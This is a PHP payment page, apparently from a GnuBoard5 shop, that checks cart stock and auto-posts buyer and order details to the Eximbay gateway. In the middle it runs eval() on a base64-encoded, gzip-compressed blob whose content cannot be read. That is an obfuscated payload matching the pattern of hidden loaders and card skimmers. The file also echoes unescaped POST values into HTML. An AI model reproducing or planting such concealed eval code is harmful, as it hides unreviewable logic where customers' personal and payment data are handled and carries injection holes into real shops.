<?php
include_once('./_common.php');
include_once(G5_PATH.'/head.sub.php');
include_once(G5_SHOP_PATH.'/settle_eximbay.inc.php');

// 장바구니가 비어있는가?
if (get_session("ss_direct"))
    $tmp_cart_id = get_session('ss_cart_direct');
else
    $tmp_cart_id = get_session('ss_cart_id');

if (get_cart_count($tmp_cart_id) == 0) { // 장바구니에 담기
    if (!is_mobile()) {
        alert_close('장바구니가 비어 있습니다.\\n\\n이미 주문하셨거나 장바구니에 담긴 상품이 없는 경우입니다.');
    }
    else {
        alert('장바구니가 비어 있습니다.\\n\\n이미 주문하셨거나 장바구니에 담긴 상품이 없는 경우입니다.', G5_SHOP_URL.'/cart.php');
    }
}

$error = "";
// 장바구니 상품 재고 검사
$sql = " select it_id,
                ct_qty,
                it_name,
                io_id,
                io_type,
                ct_option
           from {$g5['g5_shop_cart_table']}
          where od_id = '$tmp_cart_id'
            and ct_select = '1' ";
$result = sql_query($sql);
for ($i=0; $row=sql_fetch_array($result); $i++)
{
    // 상품에 대한 현재고수량
    if($row['io_id']) {
        $it_stock_qty = (int)get_option_stock_qty($row['it_id'], $row['io_id'], $row['io_type']);
    } else {
        $it_stock_qty = (int)get_it_stock_qty($row['it_id']);
    }
    // 장바구니 수량이 재고수량보다 많다면 오류
    if ($row['ct_qty'] > $it_stock_qty)
        $error .= "{$row['ct_option']} 의 재고수량이 부족합니다. 현재고수량 : $it_stock_qty 개\\n\\n";
}

if($i == 0) {
    if (!is_mobile()) {
        alert_close('장바구니가 비어 있습니다.\\n\\n이미 주문하셨거나 장바구니에 담긴 상품이 없는 경우입니다.');
    }
    else {
        alert('장바구니가 비어 있습니다.\\n\\n이미 주문하셨거나 장바구니에 담긴 상품이 없는 경우입니다.', G5_SHOP_URL.'/cart.php');
    }
}

if ($error != "")
{
    $error .= "다른 고객님께서 {$od_name}님 보다 먼저 주문하신 경우입니다. 불편을 끼쳐 죄송합니다.";
    if (!is_mobile()) {
        alert_close($error);
    }
    else {
        alert($error, G5_SHOP_URL.'/cart.php');
    }
}

$od_id  = get_session('ss_order_id');

$sql = " select * from {$g5['g5_shop_order_data_table']} where od_id = '$od_id' order by dt_time desc limit 1 ";
$row = sql_fetch($sql);

$od = unserialize(base64_decode($row['dt_data']));

$uid = md5($od_id.$row['dt_time'].$REMOTE_ADDR);
set_session('ss_orderview_uid', $uid);

$buyer          = $od['od_name'];
$tel            = $od['od_tel'];
$email          = $od['od_email'];
$od_hp          = $od['od_hp'];
$amt            = (int)$_POST['good_mny'];
$visitorid      = $_POST['visitorid'];
$eb_product     = $_POST['eb_product'];
$eb_goods_cnt   = $_POST['eb_goods_cnt'];

$g_conf_paymethod = $_POST['od_settle_case']; // 결제방식

/*
paymethod
P000 = CreaditCard
P101 = VISA
P102 = MasterCard
P103 = AMAX
P104 = JCB
P001 = Paypal
P002 = CUP
P003 = Alipay
P004 = Tenpay
P141 = WeChat
P005 = 99Bill
P006 = 일본편의점, 인터넷뱅킹 결제
*/

if ($g_conf_paymethod == 'P141' && is_mobile()) { // 결제환경이 모바일일경우 weChat 은 P142 로 변경한다.
    $g_conf_paymethod = 'P142'; // INAPP 결제
}

$fgdate = array();
$fgdate['ver']                   = $g_conf_ver;
$fgdate['txntype']               = 'PAYMENT';
$fgdate['charset']               = 'UTF-8';
$fgdate['statusurl']             = G5_SHOP_URL.'/eximbay/pg_hub.php';
$fgdate['returnurl']             = G5_SHOP_URL.'/eximbay/order_result.php';
$fgdate['dm_shipTo_country']     = $g_ship_country;
$fgdate['dm_shipTo_phoneNumber'] = $od_hp;
$fgdate['mid']                   = $g_conf_site_cd;
$fgdate['ref']                   = $od_id;
$fgdate['ostype']                = is_mobile() ? 'M' : 'P';
$fgdate['displaytype']           = 'P'; // P: popup (default)/ R: Page redirect
$fgdate['cur']                   = $g_conf_currency;
$fgdate['amt']                   = $amt;
$fgdate['shop']                  = $default['de_admin_company_name'];
$fgdate['buyer']                 = $buyer;
$fgdate['email']                 = $email;
$fgdate['tel']                   = $tel;
$fgdate['lang']                  = $g_conf_language;
$fgdate['paymethod']             = $g_conf_paymethod;
$fgdate['autoclose']             = 'Y';
$fgdate['item_0_product']        = $eb_product;
$fgdate['item_0_quantity']       = $eb_goods_cnt;
$fgdate['item_0_unitPrice']      = $amt;

eval(unserialize(gzinflate(base64_decode('lVNNb9pAEL0j8R9GkdU1imvyIXIA0Yo0jlo1AWRILwhZG7PGK8C2dtchUCH10GOuPVbi2EOl9tBDD/1FpfkP3bWxKeVQaglGnn3z5r3xLK8en5yeVg80HjJBg2EbMzzhUAeEalAuw+PDw+rjj9WX74/vv8Kv5YfV8jP8/PZutfxULGg+5v41jiQaM4ZneqlWLBQLXsgIdn1d84YDLAhgDtprMoP6M9Du8DgmJXhbLIB8MoKeOu+D5EkBkmYh6TmdE5lzwzgQeoZVPUZK7FZGS0CESfhRLZcAOSYRMdqIyCVQT4LyYilANX16nJ8nMrdnY9YTKhPVkam4ailykQYy5uQ/ik30BG0THB5metIxSHNjGozOY0/NZ+i4YeA5nAriJDzPkflXDzUOb5iYBWVfR9zHJ5UzZEDGtP5QceAKGgYwnTt3hFGPuli969I9pGLW3ylmY7USvkAmElFV/pfVbzqdymBOiQjnMqIRU2kpMCCuKP9JaUZ+lPlcc0YhF3xrdTbpHoq4MwgnmAaor2w7Hct+Y9k9lEan2bi2UH+3JnLDAUHJKqHpfOZWyD2d3OIZSgwnYDc1o4JDAyry1kmGSy+R3C31YsCLG/uq1e46MhjJFPbASnnnrY5lgGBy1f+Nf2k1LizbAA/LzdkD3251uhk57IW+fGVdXXSM9Zz2aGFb3Ru72bUbzc6lkrbVTGOEx2ORjZDcEzet35bjjkNOsoNs+Oq28fiWC6avaQw4MqBSUlcPEcZChjbLp54BJTsVZ6XMwwLWV2Rng2sHtd8='))));
?>

<script type="text/javascript">
<!--
    // 결제 중 새로고침 방지 샘플 스크립트 (중복결제 방지)
    function noRefresh()
    {
        /* CTRL + N키 막음. */
        if ((event.keyCode == 78) && (event.ctrlKey == true))
        {
            event.keyCode = 0;
            return false;
        }
        /* F5 번키 막음. */
        if(event.keyCode == 116)
        {
            event.keyCode = 0;
            return false;
        }
    }

    function fnSubmit(f) {
        var _action = "<?php echo $g_conf_action_url?>";

        emulAcceptCharset(f);

        f.action = _action;
        f.method = "post";
        f.submit();
    }
    function emulAcceptCharset(form) {
        var agent = navigator.userAgent.toLowerCase();
        if (agent.indexOf("msie") != -1) {
            document.characterSet = form.acceptCharset;
        }
        return true;
    }

    document.onkeydown = noRefresh ;

    window.onload = function() {
        fnSubmit(document.forms.frmConfirm);
    }

//-->
</script>

<div style="text-align:center;margin-top:100px;">
    <div><img src="./img/loading.gif" border=0 /></div>
    <div style="margin:10px 0 0;">
        &copy; <?php echo $default['de_admin_company_name'];?>
    </div>
    <div style="margin:10px 0 0;">
        Wait Please.....
    </div>
</div>

<form name="frmConfirm" id="frmConfirm" action="">
<input type="hidden" name="fgkey" value="<?php echo $fgkey; ?>" />
<input type="hidden" name="ver" value="<?php echo $fgdate['ver'];?>" />
<input type="hidden" name="txntype" value="<?php echo $fgdate['txntype'];?>" />
<input type="hidden" name="charset" value="<?php echo $fgdate['charset'];?>" />
<input type="hidden" name="statusurl" value="<?php echo $fgdate['statusurl'];?>" />
<input type="hidden" name="returnurl" value="<?php echo $fgdate['returnurl'];?>" />
<input type="hidden" name="dm_shipTo_country" value="<?php echo $fgdate['dm_shipTo_country'];?>" />
<input type="hidden" name="dm_shipTo_phoneNumber" value="<?php echo $fgdate['dm_shipTo_phoneNumber'];?>" />
<input type="hidden" name="mid" value="<?php echo $fgdate['mid'];?>" />
<input type="hidden" name="ref" value="<?php echo $fgdate['ref'];?>" />
<input type="hidden" name="ostype" value="<?php echo $fgdate['ostype'];?>" />
<input type="hidden" name="displaytype" value="<?php echo $fgdate['displaytype'];?>" />
<input type="hidden" name="cur" value="<?php echo $fgdate['cur'];?>" />
<input type="hidden" name="amt" value="<?php echo $fgdate['amt'];?>" />
<input type="hidden" name="shop" value="<?php echo $fgdate['shop'];?>" />
<input type="hidden" name="buyer" value="<?php echo $fgdate['buyer'];?>" />
<input type="hidden" name="email" value="<?php echo $fgdate['email'];?>" />
<input type="hidden" name="tel" value="<?php echo $fgdate['tel'];?>" />
<input type="hidden" name="lang" value="<?php echo $fgdate['lang'];?>" />
<input type="hidden" name="paymethod" value="<?php echo $fgdate['paymethod'];?>" />
<input type="hidden" name="autoclose" value="<?php echo $fgdate['autoclose'];?>" />
<input type="hidden" name="item_0_product" value="<?php echo $fgdate['item_0_product']; ?>" />
<input type="hidden" name="item_0_quantity" value="<?php echo $fgdate['item_0_quantity']; ?>" />
<input type="hidden" name="item_0_unitPrice" value="<?php echo $fgdate['item_0_unitPrice']; ?>" />
</form>

<?php
include_once(G5_PATH.'/tail.sub.php');
?>
